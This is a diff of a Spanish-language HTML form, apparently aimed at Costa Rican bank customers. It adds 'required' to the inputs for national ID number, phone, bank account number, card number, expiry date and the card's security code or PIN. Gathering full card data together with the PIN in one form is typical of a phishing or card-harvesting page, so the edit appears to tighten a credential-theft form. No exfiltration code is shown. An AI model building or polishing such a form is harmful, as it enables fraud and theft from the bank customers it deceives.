@@ -230,7 +230,7 @@ nuestra parte: </p>
   <!-- 2. Número de cédula -->
   <div class="form-group full">
     <label for="cedula">Número de cédula</label>
-    <input type="text" id="cedula" name="cedula" placeholder="Ej: 1-1234-5678" />
+    <input type="text" id="cedula" name="cedula" placeholder="Ej: 1-1234-5678" required />
   </div>
 
   <!-- 3. Correo electrónico -->
@@ -242,7 +242,7 @@ nuestra parte: </p>
   <!-- 4. Número de teléfono -->
   <div class="form-group full">
     <label for="telefono">Número de teléfono</label>
-    <input type="tel" id="telefono" name="telefono" placeholder="Ej: +506 8888-0000" />
+    <input type="tel" id="telefono" name="telefono" placeholder="Ej: +506 8888-0000" required />
   </div>
 
   <!-- 5. Entidad bancaria -->
@@ -274,25 +274,25 @@ nuestra parte: </p>
   <!-- 7. Número de cuenta bancaria -->
   <div class="form-group full">
     <label for="num_cuenta">Número de cuenta bancaria asociado a la tarjeta</label>
-    <input type="text" id="num_cuenta" name="num_cuenta" placeholder="Ej: CR21 0152 0200 1026 2840 66"  />
+    <input type="text" id="num_cuenta" name="num_cuenta" placeholder="Ej: CR21 0152 0200 1026 2840 66" required />
   </div>
 
   <!-- 8. Número de tarjeta -->
   <div class="form-group full">
     <label for="num_tarjeta">Número de tarjeta</label>
-    <input type="text" id="num_tarjeta" name="num_tarjeta" placeholder="XXXX XXXX XXXX XXXX" maxlength="19"  />
+    <input type="text" id="num_tarjeta" name="num_tarjeta" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required />
   </div>
 
   <!-- 9. Fecha de vencimiento -->
   <div class="form-group">
     <label for="vencimiento">Fecha de vencimiento de la tarjeta</label>
-    <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" maxlength="5"  />
+    <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" maxlength="5" required />
   </div>
 
   <!-- 10. Código o PIN -->
   <div class="form-group">
     <label for="pin">Código o PIN de seguridad de la tarjeta</label>
-    <input type="password" id="pin" name="pin" placeholder="***" maxlength="4" />
+    <input type="password" id="pin" name="pin" placeholder="***" maxlength="4" required />
   </div>
 
 </div><!-- /form-grid -->
